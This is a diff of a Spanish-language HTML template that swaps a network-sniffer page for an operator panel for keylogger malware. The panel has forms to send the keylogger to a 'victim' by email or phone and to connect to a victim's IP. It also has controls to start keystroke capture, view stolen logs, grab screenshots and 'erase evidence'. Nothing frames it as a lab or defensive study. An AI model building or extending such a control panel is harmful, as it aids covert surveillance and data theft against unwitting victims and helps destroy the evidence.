@@ -1,42 +1,72 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sniffer de Red</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; }
-        table { width: 80%; margin: 20px auto; border-collapse: collapse; }
-        th, td { padding: 10px; border: 1px solid black; }
-        th { background-color: #f2f2f2; }
-    </style>
+  <meta charset="UTF-8">
+  <title>Control de Keylogger</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <h1>Sniffer de Red</h1>
-    <button onclick="iniciarSniffer()">Iniciar Sniffer</button>
-    <table>
-        <thead>
-            <tr>
-                <th>Origen</th>
-                <th>Destino</th>
-                <th>Protocolo</th>
-            </tr>
-        </thead>
-        <tbody id="paquetes"></tbody>
-    </table>
+<body class="bg-gray-900 text-white min-h-screen flex flex-col items-center py-10">
+  <h1 class="text-3xl font-bold mb-6">Panel Keylogger</h1>
 
-    <script>
-        var socket = io.connect("http://" + document.domain + ":" + location.port);
+  <!-- Formulario de envío -->
+  <form method="POST" action="/send_keylogger" class="bg-gray-800 p-6 rounded-xl shadow-md w-full max-w-md mb-6">
+    <h2 class="text-xl font-semibold mb-4">Enviar keylogger a víctima</h2>
+    <input type="text" name="correo" placeholder="Correo electrónico" class="w-full mb-3 px-3 py-2 bg-gray-700 rounded" />
+    <input type="text" name="numero" placeholder="Número telefónico" class="w-full mb-3 px-3 py-2 bg-gray-700 rounded" />
+    <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white py-2 rounded">Enviar</button>
+    {% if mensaje %}
+    <p class="mt-4 text-green-400">{{ mensaje }}</p>
+    {% endif %}
+  </form>
 
-        function iniciarSniffer() {
-            socket.emit('iniciar_sniffer');
-        }
+  <!-- Control remoto -->
+  <form method="POST" action="/connect" class="bg-gray-800 p-6 rounded-xl shadow-md w-full max-w-md mb-6">
+    <h2 class="text-xl font-semibold mb-4">Conectar a máquina remota</h2>
+    <input type="text" name="ip" placeholder="IP víctima" value="{{ ip or '' }}" class="w-full mb-3 px-3 py-2 bg-gray-700 rounded" required />
+    <button type="submit" class="w-full bg-blue-600 hover:bg-blue-500 text-white py-2 rounded">Conectar</button>
+    {% if response %}
+    <p class="mt-4 text-yellow-400">Respuesta: {{ response }}</p>
+    {% endif %}
+  </form>
 
-        socket.on('nuevo_paquete', function(data) {
-            let fila = `<tr><td>${data.origen}</td><td>${data.destino}</td><td>${data.protocolo}</td></tr>`;
-            document.getElementById("paquetes").innerHTML += fila;
-        });
-    </script>
+  {% if ip %}
+  <div class="grid grid-cols-1 md:grid-cols-2 gap-4 max-w-3xl w-full">
+
+    <form method="POST" action="/start" class="bg-gray-800 p-4 rounded-xl">
+      <input type="hidden" name="ip" value="{{ ip }}">
+      <button type="submit" class="w-full bg-green-600 hover:bg-green-500 py-2 rounded">Iniciar Keylogger</button>
+    </form>
+
+    <form method="POST" action="/view_logs" class="bg-gray-800 p-4 rounded-xl">
+      <input type="hidden" name="ip" value="{{ ip }}">
+      <button type="submit" class="w-full bg-yellow-600 hover:bg-yellow-500 py-2 rounded">Ver Logs</button>
+    </form>
+
+    <form method="POST" action="/screenshot" class="bg-gray-800 p-4 rounded-xl">
+      <input type="hidden" name="ip" value="{{ ip }}">
+      <button type="submit" class="w-full bg-pink-600 hover:bg-pink-500 py-2 rounded">Captura de Pantalla</button>
+    </form>
+
+    <form method="POST" action="/delete" class="bg-gray-800 p-4 rounded-xl">
+      <input type="hidden" name="ip" value="{{ ip }}">
+      <button type="submit" class="w-full bg-red-600 hover:bg-red-500 py-2 rounded">Borrar Evidencia</button>
+    </form>
+
+  </div>
+  {% endif %}
+
+  {% if log %}
+  <div class="w-full max-w-4xl mt-8">
+    <h3 class="text-xl font-semibold mb-2">Logs capturados</h3>
+    <textarea readonly class="w-full h-64 p-4 bg-gray-800 text-green-400 rounded">{{ log }}</textarea>
+  </div>
+  {% endif %}
+
+  {% if screenshot %}
+  <div class="w-full max-w-xl mt-8 text-center">
+    <h3 class="text-xl font-semibold mb-2">Captura de pantalla</h3>
+    <img src="{{ url_for('static', filename='uploads/' + screenshot.split('/')[-1]) }}" class="rounded-lg shadow" />
+  </div>
+  {% endif %}
 </body>
 </html>
